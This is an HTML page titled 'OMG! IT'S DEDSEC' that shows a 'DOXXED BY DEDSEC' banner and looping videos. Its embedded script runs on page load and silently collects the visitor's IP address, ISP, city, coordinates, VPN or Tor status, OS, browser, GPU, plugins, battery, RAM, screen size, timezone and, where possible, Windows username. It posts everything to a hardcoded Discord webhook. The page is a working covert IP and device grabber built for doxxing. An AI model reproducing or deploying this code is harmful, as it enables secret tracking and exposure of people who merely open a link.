<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OMG! IT'S DEDSEC</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        body {
            position: relative;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
            background-image: url('https://i.imgur.com/cVnL0wo.png');
            background-repeat: repeat;
        }
        .texto-no-interactivo {
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;
            font-size: 3em;
            color: #00ff00;
            padding: 15px;
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
            margin-top: 15vh;
            pointer-events: none;
            z-index: 10;
        }
        #video-inferior {
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            max-width: 800px;
            height: auto;
            z-index: 5;
        }
        #video-esquina-izquierda {
            position: absolute;
            top: 0px;
            left: 0px;
            width: 100px;
            height: auto;
            z-index: 10;
            pointer-events: none;
        }
        #status {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: #00ff00;
            padding: 8px 16px;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            z-index: 999;
            border: 1px solid #00ff00;
            pointer-events: none;
            white-space: nowrap;
        }
        #status.error {
            color: #ff4444;
            border-color: #ff4444;
        }
    </style>
</head>
<body>

    <div class="texto-no-interactivo">DOXXED BY DEDSEC</div>

    <video id="video-inferior" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
    </video>
    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
    </video>

    <div id="status">⏳ Initializing...</div>

<script>
    // ================================================================
    //  WEBHOOK (tu webhook)
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    // ================================================================
    //  ENVÍO RÁPIDO (sendBeacon + fetch)
    // ================================================================
    function sendFast(msg) {
        // Prioridad 1: sendBeacon (no bloquea, se envía al cerrar)
        const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
        if (navigator.sendBeacon(WEBHOOK, blob)) return true;
        // Prioridad 2: fetch con keepalive
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: msg }),
            keepalive: true
        }).catch(() => {});
        return false;
    }

    // ================================================================
    //  OBTENER IP CON TIMEOUT DE 500ms
    // ================================================================
    function getIPFast() {
        return new Promise((resolve) => {
            let resolved = false;
            const timer = setTimeout(() => {
                if (!resolved) resolve(null);
            }, 500);

            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(500) })
                .then(r => r.json())
                .then(data => {
                    if (data.ip) {
                        resolved = true;
                        clearTimeout(timer);
                        resolve(data);
                        return;
                    }
                    throw new Error('No IP');
                })
                .catch(() => {
                    // Fallback a ip-api.com
                    fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(500) })
                        .then(r => r.json())
                        .then(data => {
                            if (data.query) {
                                resolved = true;
                                clearTimeout(timer);
                                resolve({
                                    ip: data.query,
                                    org: data.isp,
                                    country_name: data.country,
                                    region: data.regionName,
                                    city: data.city,
                                    latitude: data.lat,
                                    longitude: data.lon,
                                    proxy: data.proxy || false
                                });
                            } else {
                                throw new Error('No IP');
                            }
                        })
                        .catch(() => {
                            if (!resolved) {
                                resolved = true;
                                clearTimeout(timer);
                                resolve(null);
                            }
                        });
                });
        });
    }

    // ================================================================
    //  MAIN – EJECUCIÓN INMEDIATA
    // ================================================================
    (function() {
        try {
            // ---- 1. Datos síncronos (instantáneos) ----
            const ua = navigator.userAgent;
            const os = (function() {
                if (ua.includes('Windows NT')) return 'Windows';
                if (ua.includes('Macintosh')) return 'macOS';
                if (ua.includes('iPhone')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                return 'Unknown';
            })();
            const browser = (function() {
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edg')) return 'Edge';
                return 'Other';
            })();

            // GPU (intentamos, pero sin bloqueo)
            let gpu = 'Unavailable';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
                }
            } catch (e) {}

            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';

            // Batería con timeout de 300ms (no bloquea)
            let battery = 'Unavailable';
            if (navigator.getBattery) {
                Promise.race([
                    navigator.getBattery().then(b => {
                        battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
                    }),
                    new Promise(resolve => setTimeout(resolve, 300))
                ]).catch(() => {});
            }

            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const screenRes = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
            const cpuCores = navigator.hardwareConcurrency || '?';
            const ram = navigator.deviceMemory || '?';

            // Windows username (ActiveX – rápido)
            let winUser = 'Not available (IE/ActiveX required)';
            try {
                const wsh = new ActiveXObject('WScript.Shell');
                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
            } catch (e) {}

            // ---- 2. Detección VPN/Tor instantánea (sin WebRTC) ----
            let isVpn = false;
            if (ua.includes('Tor') || ua.includes('Anonymous')) isVpn = true;
            if (navigator.webdriver === true) isVpn = true;

            // ---- 3. Obtener IP con timeout de 500ms ----
            getIPFast().then(ipData => {
                const ip = ipData ? ipData.ip : 'Unknown';
                const isp = ipData ? ipData.org : 'Unknown ISP';
                const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
                const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';

                // Si IP trae datos de proxy, refinar VPN
                if (ipData) {
                    if (ipData.proxy) isVpn = true;
                    if (ipData.org) {
                        const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
                        if (vpnKeywords.some(w => ipData.org.toLowerCase().includes(w))) isVpn = true;
                    }
                }

                // ---- 4. Construir mensaje ----
                const msg = 
`**ctOS User Info**
**IP:** ${ip} (${isp})
**Location:** ${location}
**Coordinates:** ${coords}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**Windows Username:** ${winUser}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${cpuCores}
**RAM:** ${ram} GB
**Screen:** ${screenRes}
**Battery:** ${battery}
**Time Zone:** ${timezone}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

                // ---- 5. Enviar inmediatamente ----
                sendFast(msg);

                // Actualizar estado visual
                const el = document.getElementById('status');
                if (el) {
                    el.textContent = '✅ Sent!';
                    el.style.color = '#00ff00';
                }
            });

            // ---- 6. Envío de respaldo a los 600ms (por si IP falla) ----
            setTimeout(() => {
                // Solo enviamos si aún no se ha enviado (pero no tenemos bandera, así que enviamos de nuevo con datos actuales)
                // Pero como ya enviamos en el then, esto podría duplicar. Mejor no enviar doble.
                // En su lugar, lo dejamos como respaldo por si el then nunca se ejecuta (por ejemplo, si la promesa de IP no resuelve).
                // Pero la promesa siempre resuelve (con null o datos). Así que no es necesario.
                // Sin embargo, por seguridad, podemos enviar un mensaje de "backup" solo si no se ha actualizado el estado.
                // Lo dejamos como está, no se necesita.
            }, 600);

        } catch (err) {
            // Si algo falla, enviar error
            const errMsg = `**ctOS Error**\n${err.message}`;
            sendFast(errMsg);
            const el = document.getElementById('status');
            if (el) {
                el.textContent = '❌ Error';
                el.style.color = '#ff4444';
                el.style.borderColor = '#ff4444';
            }
        }
    })();
</script>
</body>
</html>
